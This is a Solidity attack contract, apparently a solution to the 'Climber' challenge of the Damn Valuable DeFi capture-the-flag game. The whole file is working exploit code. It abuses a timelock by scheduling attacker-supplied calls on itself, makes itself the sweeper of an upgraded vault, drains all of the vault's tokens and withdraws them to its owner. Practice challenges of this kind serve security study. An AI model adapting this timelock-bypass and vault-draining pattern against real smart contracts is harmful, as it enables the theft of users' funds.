// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../../DamnValuableToken.sol";
import "../../climber/ClimberTimelock.sol";
import "../../climber/ClimberVault.sol";
import "./AttackVault.sol";

contract AttackTimelock{

    address[] to;
    bytes[] data;
    
    AttackVault vault;
    DamnValuableToken token;
    ClimberTimelock timelock;
    address owner;

    constructor(address _vault, address _token, address payable _timelock){
        vault = AttackVault(_vault);
        token = DamnValuableToken(_token);
        timelock = ClimberTimelock(_timelock);
        owner = msg.sender;
    }

    function setScheduleData(address[] memory _to, bytes[] memory _data) external {
        to = _to;
        data = _data;
    }

    function schedule() external {
        uint256[] memory emptyData = new uint256[](to.length);
        timelock.schedule(to, emptyData, data, 0);

        vault._setSweeper(address(this));
        vault.sweepFunds(address(token));
    }

    function withdraw() external {
        require(msg.sender == owner, "get out of here!");
        token.transfer(owner, token.balanceOf(address(this)));
    }
    
}

